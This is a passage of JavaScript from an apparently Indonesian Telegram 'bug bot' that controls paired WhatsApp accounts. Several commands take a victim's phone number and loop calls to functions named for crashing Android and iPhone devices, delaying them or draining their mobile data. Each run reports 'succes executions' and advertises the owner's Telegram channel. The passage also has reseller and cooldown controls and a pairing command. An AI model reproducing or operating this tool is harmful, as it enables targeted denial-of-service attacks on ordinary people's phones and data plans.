          const userId = ctx.from.id.toString();
          if (!checkCommandAccess(userId, "clearsender")) {
            return ctx.reply(getNoAccessMessage(userId));
          }

          const confirmMsg = await ctx.reply(
            "⚠️ *Peringatan!*\n\nAksi ini akan:\n❌ Menghapus SEMUA session WhatsApp\n❌ Menghapus SEMUA folder session\n✅ Restart bot otomatis\n\nLanjutkan?",
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Ya, Hapus Semua",
                      callback_data: "clearsender_confirm",
                    },
                    { text: "❌ Batal", callback_data: "clearsender_cancel" },
                  ],
                ],
              },
            }
          );
        } catch (err) {
          log.error(`Error in /clearsender for ${userId}: ${err.message}`);
          await ctx.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
        }
        break;
      }
      
      case "Xzesoandro": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesoandro lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Xzesoandro 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoandro 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 100; z++) {
                await autosync(client, X);
                await audiocall(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
case "Droidx": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Droidx lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Droidx 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoandro 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 30; z++) {
                await crashSendPaymentNPE(client, X);
                await audiocall(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Betaxzeso": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Betaxzeso lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Betaxzeso 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoandro 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 2; z++) {
                await fungadjigelo(client, X);
                await crashSendPaymentNPE(client, X);
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Uixzeso": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Uixzeso lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Uixzeso 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Uixzeso 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       (async () => {
                for (let z = 0; z < 50; z++) {
                await crashandro(client, X);
                await new Promise(resolve => setImmediate(resolve));
                await crashandro(client, X);
                await new Promise(resolve => setImmediate(resolve)); 
                }
                })();

    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Delayxzeso": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Delayxzeso lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Delayxzeso 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Delayxzeso 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       
       (async () => {
                for (let z = 0; z < 80; z++) {
                await hardfix1(client, X);
                await hardfix3(client, X);
                await delayhigh(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Betaxzosex": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Betaxzosex lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Betaxzosex 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Betaxzosex 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

        (async () => {
                for (let z = 0; z < 100; z++) {
                await delaybeta(client, X);
                await delayhigh(client, X);
                await hardfix1(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       
     
        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Xzesoiosx": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesoiosx lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Xzesoiosx 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoiosx 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🎭 <b>type bug:</b> <code>crash iphone</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

               (async () => {
                for (let z = 0; z < 200; z++) {
                await XoipCrash(client, X);
                await XoipFc(client, X, ptcp = true);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "invisisendx": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /invisisendx lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/invisisendx 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/invisisendx 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>delay andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

       
               (async () => {
                for (let z = 0; z < 100; z++) {
                await Occolot(client, X);
                await hardfix3(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "Xzesox": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesox lagi.`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Xzesox 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesox 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const clientEntry = waClients[userId];
        
        if (
            !clientEntry ||
            clientEntry.status !== "open" ||
            !clientEntry.sock
        ) {
            return ctx.reply(
                "<b>📵 WhatsApp belum terhubung.</b>\n" +
                "Silakan pairing dengan:\n" +
                "<code>/reqpair 628xxxx</code>",
                { parse_mode: "HTML" }
            );
        }

        const client = clientEntry.sock;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>sedot kuota andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @XComanderx for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/XComanderx",
                        },
                    ],
                ],
            },
        });

               (async () => {
                for (let z = 0; z < 120; z++) {
                await BuldozerCombine(client, X, ptcp = true);
                await ZenoDrainKuota(client, X, ptcp = true);
                await delayhigh(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
      
      case "clearsender": {
        try {
          const userId = ctx.from.id.toString();
          if (!checkCommandAccess(userId, "clearsender")) {
            return ctx.reply(getNoAccessMessage(userId));
          }

          const confirmMsg = await ctx.reply(
            "⚠️ *Peringatan!*\n\nAksi ini akan:\n❌ Menghapus SEMUA session WhatsApp\n❌ Menghapus SEMUA folder session\n✅ Restart bot otomatis\n\nLanjutkan?",
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Ya, Hapus Semua",
                      callback_data: "clearsender_confirm",
                    },
                    { text: "❌ Batal", callback_data: "clearsender_cancel" },
                  ],
                ],
              },
            }
          );
        } catch (err) {
          log.error(`Error in /clearsender for ${userId}: ${err.message}`);
          await ctx.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
        }
        break;
      }

      /**
       * fitue cooldown created by siros
       * cocok buat murbug ye
       * sistem bakal ngebaca otomatis pas ada yg gunain cmd bugnya yg di cooldow
       * janlup aktifin /cdon terlebih dahulu
       */

      case "cdon": {
        try {
          const userId = ctx.from.id.toString();
          if (!isOwner(ctx.from.id))
    return ctx.reply("❌ Hanya owner!");

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.enableCooldown();

          await ctx.reply(
            "✅ *Cooldown System Diaktifkan*\n\n" +
              "🔒 Commands yang di-cooldown (20 menit per penggunaan):\n" +
              "• /Xzesoandro\n" +
              "• /Delayxzeso\n" +
              "• /Xzesoiosx\n\n" +
              "⏰ Setiap user yang menggunakan command ini akan mendapat cooldown 20 menit.",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDON ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan cooldown.");
        }
        break;
      }
      case "cdoff": {
        try {
          const userId = ctx.from.id.toString();
          if (userId !== config.ownerId.toString()) {
            return ctx.reply(
              "❌ Hanya owner yang bisa menggunakan command ini."
            );
          }

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.disableCooldown();

          await ctx.reply(
            "✅ *Cooldown System Dimatikan*\n\n" +
              "🔓 User bisa menggunakan semua command tanpa cooldown.",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDOFF ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat menonaktifkan cooldown.");
        }
        break;
      }
      case "setcd": {
        try {
          const userId = ctx.from.id.toString();
          const cooldownModule = require("./controlSystem/sumemek.js");

          const isEnabled = cooldownModule.isCooldownEnabled();
          const userStatus = cooldownModule.getUserCooldownStatus(userId);

          let message = "📊 *Status Cooldown System*\n";
          message += "═══════════════════════════════════\n\n";
          message += `🔧 *Status:* ${
            isEnabled ? "✅ AKTIF" : "❌ NONAKTIF"
          }\n\n`;

          message += "*📌 Cooldown User Kamu:*\n";
          message += "───────────────────────\n";

          for (const [cmd, info] of Object.entries(userStatus)) {
            const status = info.onCooldown
              ? `⏳ Cooldown (${info.remaining} menit)`
              : "✅ Siap Digunakan";
            message += `• /${cmd}: ${status}\n`;
            message += `  Last used: ${info.lastUsed}\n`;
          }

          message += "\n═══════════════════════════════════\n";
          message += "⏰ *Cooldown Duration:* 20 menit per command\n";
          message += "*💡 Tips:* Cooldown berlaku per-command per-user";

          await ctx.reply(message, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`SETCD ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat membaca status cooldown.");
        }
        break;
      }

      case "setcd": {
        const userId = ctx.from.id.toString();
        if (!isOwner(ctx.from.id) && !isReseller(ctx.from.id))
    return ctx.reply("❌ Hanya reseller yang bisa akses!");

        const cmdName = args[0];
        const minutes = parseInt(args[1]);

        if (!cmdName || isNaN(minutes)) {
          return ctx.reply(
            "👀 *Usage:* /setcd <command> <minutes>\nharap masukan cooldown yang lumayan banyak agar bot tidak mudah close sender atau mati"
          );
        }

        const result = cooldown.setCooldown(cmdName, minutes);
        return ctx.reply(result.message);
      }

      case "reqpair": {
        try {
          const userId = ctx.from.id.toString();

          const phone = args[0]?.replace(/[^0-9]/g, "");
          if (!phone) {
            return await ctx.reply(
              "⚠️ *Format Salah!*\nContoh:\n`/reqpair 628xxxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const exists = await checkSessionExistsForUser(userId);
          if (exists && waClients[userId]?.status === "open") {
            return ctx.reply("⚠️ Kamu sudah punya sesi WhatsApp aktif.", {
              parse_mode: "Markdown",
            });
          }

          const waitMessage = await ctx.reply(
            "⏳ *Memproses...*\nMembuat pairing code untukmu...",
            { parse_mode: "Markdown" }
          );
          await initWhatsappForUser(userId, true);
          waClients[userId].waitMessageId = waitMessage.message_id;

          await new Promise((r) => setTimeout(r, 800));
          const client = waClients[userId]?.sock;
          if (!client) {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "❌ Gagal menginisialisasi WhatsApp. Coba lagi nanti."
            );
          }

          if (typeof client.requestPairingCode === "function") {
            const code = await client.requestPairingCode(phone);
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            const pairingMessage = await ctx.reply(
              `✅ *Pairing Code Siap!*\n\n📱 *Nomor:* \`${phone}\`\n🔐 *Kode:* \`${code}\`\n\nMasukkan kode ini di aplikasi WhatsApp agar tersambung.`,
              { parse_mode: "Markdown" }
            );

            waClients[userId].pairingMessageId = pairingMessage.message_id;

            setTimeout(async () => {
              try {
                if (waClients[userId]?.status !== "open") {
                  await ctx.api.sendMessage(
                    userId,
                    "⏰ *Pairing Code Expired*\nSilahkan minta ulang dengan `/reqpair`.",
                    { parse_mode: "Markdown" }
                  );
                  if (waClients[userId]) {
                    try {
                      await waClients[userId].sock.end();
                    } catch {}
                    delete waClients[userId];
                  }
                }
              } catch (e) {
                log.error(`Timeout handler for ${userId}: ${e.message}`);
              }
            }, 60 * 1000);
          } else {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "⚠️ Baileys build kamu tidak support pairing API."
            );
          }
        } catch (err) {
          log.error(`Pairing failed for ${userId}: ${err.message}`);
          await ctx.reply(
            "❌ *Gagal Pairing*\nTerjadi kesalahan tak terduga.",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      /**
       * ngebaca semua pairing data dari user yo
       * misal mau tambahin data expose lagi , tinggal samain dari freekey
       */

      case "listpair": {
        try {
          const userId = ctx.from.id.toString();


          let result = "📌 *Daftar Sender WhatsApp Terhubung*\n";
          result += "═══════════════════════════════════\n\n";
          let count = 0;

          for (const uid in waClients) {
            const clientData = waClients[uid];

            if (!clientData || clientData?.status !== "open") continue;

            const sock = clientData?.sock;
            if (!sock) continue;

            count++;

            try {
              const authState = sock?.authState;
              const creds = authState?.creds || {};
              const me = creds?.me || {};

              const userJid = sock?.user?.id || me?.id || sock?.user?.jid || "";
